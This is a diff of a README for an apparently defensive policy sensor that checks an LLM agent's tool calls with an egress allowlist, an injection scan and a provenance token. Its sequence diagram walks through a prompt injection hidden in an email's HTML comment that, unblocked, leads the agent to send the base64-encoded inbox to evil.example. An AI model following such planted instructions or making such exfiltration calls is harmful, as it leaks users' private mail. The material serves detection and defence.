@@ -52,7 +52,7 @@ graph LR
     subgraph "sensor.py — PDP Process :8888"
         PDP[Policy Decision Point] --> C1[Check 1\nEgress Allowlist]
         PDP --> C2[Check 2\nPrompt Carrier Scan]
-        PDP --> C3[Check 3\nCanary Token]
+        PDP --> C3[Check 3\nProvenance Token]
         C1 & C2 & C3 --> V[Verdict\nallow · flag · block]
         V --> LOG[(Decision Log\nJSONL)]
         V --> SSE[SSE Feed\n/events]
@@ -91,9 +91,9 @@ flowchart TD
     C -->|HTML comment · keywords\nbase64 blob · URL in instruction| C_FL([flag\n+ redact output])
 
     C_OK & C_FL --> K
-    K{Check 3\nCanary Token}
-    K -->|canary not in params| K_OK([allow])
-    K -->|canary from prior output\nappears in this call's params| K_BL([block\nLLM was influenced\nby retrieved content])
+    K{Check 3\nProvenance Token}
+    K -->|provenance token not in params| K_OK([allow])
+    K -->|provenance token from prior output\nappears in this call's params| K_BL([block\nLLM was influenced\nby retrieved content])
 
     style E_BL fill:#2a0d0d,color:#f85149
     style C_FL fill:#2a1f00,color:#d29922
@@ -107,12 +107,12 @@ flowchart TD
 |-------|--------|-----------|---------|
 | **Egress allowlist** | Destination vs. `policy.yaml` | Near-zero — binary allowlist | Calls to undeclared hosts |
 | **Prompt carrier scan** | Injection patterns in tool output | Moderate — tunable patterns | EchoLeak idiom, keyword injection |
-| **Canary token** | PDP-injected token reappearing in later params | Near-zero — 8 random hex chars | LLM influenced by retrieved content, any destination |
+| **Provenance token** | PDP-injected token reappearing in later params | Near-zero — 8 random hex chars | LLM influenced by retrieved content, any destination |
 
-The canary check is the interesting one. It operates on the **influence signal**, not
-the destination or content. Even if the attacker targets an allowed destination with
-unknown keywords, the canary fires when the LLM copies injected content into a tool
-call.
+The provenance token check is the interesting one. It operates on the **influence signal**,
+not the destination or content. Even if the attacker targets an allowed destination with
+unknown keywords, the provenance token check fires when the LLM copies injected content
+into a tool call.
 
 ---
 
@@ -126,26 +126,27 @@ sequenceDiagram
     participant E as evil.example
 
     U->>A: "Summarize my unread emails"
-    A->>P: check read_email({})
+    A->>P: check read_email({email_id: 1..3}) + output
     P-->>A: allow
-    A->>P: check read_email({email_id: 4}) + output
-    Note over P: Check 2: flags HTML comment<br/>"compliance logging" + "do not mention"<br/>Output redacted before LLM sees it
-    P-->>A: flag · redacted output
 
     rect rgb(42, 13, 13)
         Note over A,E: ACTIVE MODE — enforcement on
-        A->>P: check http_get({url: evil.example/collect?data=...})
-        Note over P: Check 1: evil.example not in allowlist
+        A->>P: check read_email({email_id: 4}) + output
+        Note over P: Check 2: detects HTML comment<br/>"compliance logging" + "do not mention"<br/>check_prompt_carrier → block
         P-->>A: block
-        A-->>U: "I was prevented from completing an action by security policy"
+        A-->>U: "I was prevented from reading an email by security policy"
+        Note over A,U: LLM never sees the injection.<br/>http_get is never attempted.<br/>Dashboard shows 🔴 block.
     end
 
     rect rgb(42, 31, 0)
         Note over A,E: MONITOR MODE — log only
+        A->>P: check read_email({email_id: 4}) + output
+        P-->>A: allow (logged as would-block)
+        Note over A: LLM receives unredacted payload.<br/>Follows injected instruction.
         A->>P: check http_get({url: evil.example/collect?data=...})
         P-->>A: allow (logged as would-block)
         A->>E: GET evil.example/collect?data=<base64 inbox>
-        Note over E: Exfiltration succeeds.<br/>Dashboard turns red.<br/>User sees clean summary.
+        Note over E: Exfiltration succeeds.<br/>User sees clean summary.<br/>Dashboard shows audit trail.
     end
 ```
 
@@ -186,7 +187,7 @@ No mocking the LLM; the PEP/PDP boundary is the natural test seam.
 ```
 tests/test_egress.py           7 tests — allowlist block/allow, monitor mode
 tests/test_prompt_carrier.py  10 tests — injection flags, FP surface cases
-tests/test_canary.py           5 tests — injection and detection, no FP on benign calls
+tests/test_provenance_token.py 5 tests — injection and detection, no FP on benign calls
 ```
 
 ---
@@ -223,7 +224,7 @@ traces/attack.json    Deterministic replay trace for the full attack path
 tests/
   test_egress.py      Egress allowlist tests
   test_prompt_carrier.py  Carrier scan tests (including documented FP cases)
-  test_canary.py      Canary injection and detection tests
+  test_provenance_token.py  Provenance token injection and detection tests
 ARCHITECTURE.md       PDP/PEP separation, control plane rationale, MCP extension
 THREAT_MODEL.md       Assets, trust boundaries, attack tree, explicit scope
 DECISIONS.md          6 ADR-style entries on every architectural choice
